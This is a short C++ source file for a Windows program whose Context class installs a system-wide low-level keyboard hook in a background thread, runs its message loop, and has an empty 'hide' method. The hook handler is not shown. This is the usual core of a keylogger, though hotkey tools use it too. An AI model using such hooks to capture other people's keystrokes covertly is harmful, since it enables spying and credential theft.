//
// Created by istimaldar on 16/06/2017.
//

#include "context.h"
#include "hooks.h"

HANDLE Context::event = NULL;
HHOOK Context::hhkLowLevelKybd = 0;

int Context::run() {
    thread = CreateThread(NULL, 0, &ThreadProc, NULL, 0, NULL);
    return 0;
}

Context::Context() {
    hhkLowLevelKybd = 0;
    if (event == NULL) {
        event = CreateEvent(NULL, TRUE, TRUE, "ContextEvent");
    }
}

int Context::stop() {
    if (hhkLowLevelKybd) {
        WaitForSingleObject(event, 10000);
        TerminateThread(thread, 0);
        UnhookWindowsHookEx(hhkLowLevelKybd);
        hhkLowLevelKybd = 0;
    }
    return 0;
}

int Context::reload() {
    return 0;
}

int Context::hide() {
    return 0;
}

int Context::exit() {
    return -1;
}

DWORD Context::ThreadProc(CONST LPVOID lpParam) {
    hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    MSG msg;
    int result = 0;
    while (!result) {    //this while loop keeps the
        SetEvent(event);
        result = GetMessage(&msg, NULL, NULL, NULL);
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        ResetEvent(event);
    }
    return 0;
}
